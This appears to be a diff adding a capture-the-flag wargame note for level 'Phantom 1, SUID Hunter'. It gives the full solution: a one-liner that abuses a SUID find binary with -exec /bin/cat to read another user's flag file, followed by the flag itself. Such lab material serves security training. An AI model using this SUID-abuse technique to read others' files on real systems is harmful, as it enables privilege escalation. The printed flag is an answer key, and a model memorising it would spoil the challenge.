@@ -1,0 +1,6 @@
+[ Phantom · Level 1 ]  SUID Hunter
+ Full brief:  cat ~/BRIEFING
+
+goal: find password for phantom2
+
+cd /tmp && /usr/local/bin/phantom-find /home/flagkeeper1 -maxdepth 1 -name level1_flag -exec /bin/cat {} \;: bl_phtm1_88c9a8f6cefa733e
